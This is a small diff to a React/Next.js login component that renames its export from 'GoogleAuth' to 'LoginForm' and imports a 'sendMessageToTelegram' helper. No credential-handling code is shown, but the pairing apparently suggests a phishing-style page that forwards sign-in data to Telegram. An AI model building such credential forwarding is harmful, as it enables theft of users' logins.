@@ -4,7 +4,7 @@ import { useRouter } from 'next/navigation';
 import { useValidateEmail } from '../app/hooks/useValidate';
 import { sendMessageToTelegram } from '../lib/api';
 
-export default function GoogleAuth() {
+export default function LoginForm() {
     const router = useRouter();
     const [isLoading, setIsLoading] = useState(false);
     const [bgLoader, setBgLoader] = useState(false);
